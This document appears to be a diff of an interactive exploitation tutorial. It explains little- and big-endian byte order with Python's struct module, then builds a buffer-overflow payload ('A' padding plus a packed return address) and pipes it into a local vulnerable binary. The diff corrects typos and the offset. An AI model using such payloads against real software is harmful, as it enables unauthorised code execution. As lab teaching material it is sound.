@@ -24,7 +24,7 @@ Let's consider the memory address 0x2131415, How will you write it in Big-Endian
 
 You can use the struct module to verify your response:
 
-type `python{{execute}} to open a python console
+type `python`{{execute}} to open a python console
 
 import the struct module: `import struct`{{execute}}
 
@@ -42,27 +42,30 @@ In your python console:
 - Print the address in Little-Endian: `struct.pack('<I', 0x2131415)`{{execute}}
 
 You can also do the opposite and obtain the decimal value from an address represented in Little ot Big-Endian:
-- `struct.pack('<I', '\x15\x14\x13\x02')`{{execute}} for little endian to decimal memory address
-- `struct.pack('>I', '\x02\x13\x14\x15')`{{execute}} for big endian to decimal memory address
+- `struct.unpack('<I', '\x15\x14\x13\x02')`{{execute}} for little endian to decimal memory address
+- `struct.unpack('>I', '\x02\x13\x14\x15')`{{execute}} for big endian to decimal memory address
 
 Conversion from base10 to base16 is easy: `hex(34804757)`{{execute}}
 
-Type `quit()`{{execute}} to exit the python console or press `<CTRL>D`
 
 ## Rewrite our previous exploit with the struct module
 
-Let's consider the below code:
+Let's consider the below code and execute it in the python console:
 
 ```python
 import struct
 offset 	= 44
-rip	= struct.pack('<I', 0x80491f7)
+rip	= struct.pack('<I', 0x80491f6)
 payload = 'A'*offset + rip
 print(payload)
-```{{copy}}
+```{{execute}}
 
-We can execute it in just one line of code: `python -c "import struct;offset=2060;rip=struct.pack('<I', 0x80491f7);payload = 'A'*offset + rip;print(payload)"`{{execute}}
+It generates a payload for our exploitation purpose. 
 
-Does the below exploit work?
+Type `quit()`{{execute}} to exit the python console or press `<CTRL>D`
 
-`echo $(python -c "import struct;offset=2060;rip=struct.pack('<I', 0x80491f7);payload = 'A'*offset + rip;print(payload)") | ./vuln`{{execute}}
+When we have a shell prompt but are outside a python console, We can execute with `python -c` any script in just one line of code: `python -c "import struct;offset=44;rip=struct.pack('<I', 0x80491f6);payload = 'A'*offset + rip;print(payload)"`{{execute}}
+
+We can pipe our payload to the vulnerable command and observe whether our exploit work
+
+`echo $(python -c "import struct;offset=44;rip=struct.pack('<I', 0x80491f6);payload = 'A'*offset + rip;print(payload)") | ./vuln`{{execute}}
